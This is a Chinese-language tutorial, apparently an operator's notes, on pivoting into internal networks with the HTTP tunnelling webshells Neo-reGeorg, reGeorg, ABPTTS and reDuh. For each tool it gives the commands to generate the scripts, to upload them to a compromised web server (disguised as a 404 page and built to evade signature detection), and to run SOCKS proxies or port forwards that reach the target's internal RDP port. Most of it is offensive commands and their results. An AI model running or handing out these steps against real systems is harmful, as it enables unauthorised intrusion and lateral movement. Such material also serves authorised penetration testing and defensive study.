# Neo-reGeorg正向代理

<details open>
<summary>详情</summary>

**Neo-reGeorg** 是一个旨在积极重构 reGeorg 的项目，目的是：

• 提高 tunnel 连接安全性

• 提高可用性，避免特征检测

• 提高传输内容保密性

• 应对更多的网络环境场景

特点

• 传输内容经过变形 base64 加密，伪装成 base64 编码

• 直接请求响应可定制化 (如伪装的 404 页面)

• HTTP Headers 的指令随机生成，避免特征检测

• HTTP Headers 可定制化

• 自定义 HTTP 响应码

• 多 URL 随机请求

• 服务端 DNS 解析

• 兼容 python2 / python3

• 服务端环境的高兼容性

• (仅 php) 参考 https://github.com/sensepost/reGeorg 实现单 Session创建多 TCP 连接，应对部分负载均衡场景

• aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行

</details>

[GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg](https://github.com/L-codes/Neo-reGeorg)

执行如下命令生成代理脚本

```python
python3 neoreg.py generate -k e9RzHa523NkPvJUp
# 自定义访问界面
python3 neoreg.py generate -k e9RzHa523NkPvJUp --file 404.html --httpcode 404
# 将 404.html 文件放在 neoreg.py 同级目录下。
```

会创建 neoreg\_servers 目录并在该目录下生成如下代理脚本。![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740316176088-85ef928c-526a-4dcb-b078-3d079f1072c2.png)

然后只需要将对应语言的脚本上传到目标 web 目录下，访问如下，说明 ok

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740316997491-762cfa28-dddb-433d-a099-9a99aed14284.png)

```python
python3 neoreg.py -l 0.0.0.0 -p 1080 -k e9RzHa523NkPvJUp -u http://192.168.64.3/tunnel.php
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740316978303-ad82d628-349b-4567-bae3-fae92b5db12b.png)

然后只要将代理设置为 socks5 VPS:1080 端口即可

# reGeorg正向代理

[GitHub - sensepost/reGeorg: The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.](https://github.com/sensepost/reGeorg)

将对应语言的脚本文件上传到目标机器，访问如下，说明 ok

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740305727788-9b418258-ba48-4dec-8487-1b46de3e6d52.png)

然后在vps使用 reGeorgSocksProxy.py 执行如下命令连接代理文件，显示如下说明成功。

```python
python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 1080 -u http://10.211.55.8/tunnel.nosocket.php
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740305851490-0df1d08b-6979-4cab-b863-1641ade49f34.png)

然后只要将代理设置为 socks5 VPS:1080 端口即可。

# ABPTTS端口转发(jsp、aspx)

[GitHub - nccgroup/ABPTTS: TCP tunneling over HTTP/HTTPS for web application servers](https://github.com/nccgroup/ABPTTS)

执行如下命令，会在 ABPTTS 目录下生成 webshell 目录

```python
# pip2 install pycrypto
# pip2 install httplib2
python2 abpttsfactory.py -o webshell
```

目录内容如下

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740396607406-10c8cd13-02ee-4945-8fc4-038b4ab43f94.png)

将对应脚本语言的文件上传到目标 web 目录下，访问如下。

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740396694923-de0096c1-0369-4b9d-ba28-03fc49d594a1.png)

然后在本地执行如下命令，会将目标机器的 3389 端口映射到本地的 3389 端口。

```python
#windows
python2 abpttsclient.py -c webshell\config.txt -u http://10.211.55.3:8080/shiro/abptts.jsp -f 127.0.0.1:3389/10.211.55.3:3389 --unsafetls
#linux/mac
python2 abpttsclient.py -c webshell//config.txt -u http://10.211.55.3:8080/shiro/abptts.jsp -f 127.0.0.1:3389/10.211.55.3:3389 --unsafetls
```

然后只要 RDP 到本地的 3389 端口就可以连接目标主机 3389 端口了。

# reDuh

reDuh 是一款将 TCP 流量封装在 HTTP 流量中的工具。

[GitHub - sensepost/reDuh: Create a TCP circuit through validly formed HTTP requests](https://github.com/sensepost/reDuh)

将对应脚本语言的文件上传到目标 web 目录下，访问如下。

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740396895630-c7ee79b2-dea4-4712-94aa-c7fdfd844666.png)

然后在本地执行如下命令

```python
java -jar reDuhClient.jar http://10.211.55.3:8080/shiro/reDuh.jsp
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740396945625-f9b9e3f8-f85e-4da5-b57f-71f00c66c084.png)

重新开一个窗口，使用 nc 监听本地的 1010 端口，然后执行如下命令，将目标主机的 3389 端口映射到本地的 33389 端口。

```python
nc -vv localhost 1010
[createTunnel]33389:127.0.0.1:3389
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740396996137-ad3e96b8-bb8c-4509-95cd-1b43de3fc2c3.png)

然后连接本地的 33389 端口即可连接到目标内网的 3389 了
